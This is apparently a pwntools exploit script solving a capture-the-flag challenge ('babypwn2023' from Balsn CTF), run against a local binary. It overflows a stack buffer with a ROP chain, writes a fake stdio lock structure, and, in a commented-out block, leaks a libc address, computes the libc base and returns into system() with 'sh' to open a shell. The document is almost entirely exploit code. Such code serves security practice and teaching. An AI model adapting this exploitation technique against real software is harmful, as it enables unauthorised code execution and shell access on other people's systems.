from pwn import *
import time
context.arch = "amd64"

#r = remote("babypwn2023.balsnctf.com", 10105)
r = process('./chall')

p = b"a"*0x28 + p64(0x401070) + p64(0x401060) + p64(0x401090)
input()
r.sendline(p)

r.recvline()
'''
0x7ffff7fa7a70 <_IO_stdfile_1_lock>:    0x0000000000000000      0x0000000000000000
0x7ffff7fa7a80 <_IO_stdfile_0_lock>:    0x0000000000000000      0x0000000000000000
'''
lock_p = p64(0x0)+p64(0x0)+p32(0x01010101)+p32(0x0)[:-1]
#time.sleep(1)
r.sendline(lock_p)
'''
leak = u64(r.recvline()[8:8+6].ljust(8,b"\x00"))
info(f"Leak: {hex(leak)}")
libc_base = leak+0x28c0
info(f"Libc: {hex(libc_base)}")
#print(r.recvall())

one_gadget = 0x50a37
system = 0x50d60
p2 = b"a"*0x28 + p64(0x401070) + p64(libc_base+system) #p64(0x401060)

r.sendline(p2)
r.recvline()

binsh = p64(0x0)+p64(0x0)+b"sh\x00\x00"
r.sendline(binsh)
'''
r.interactive()
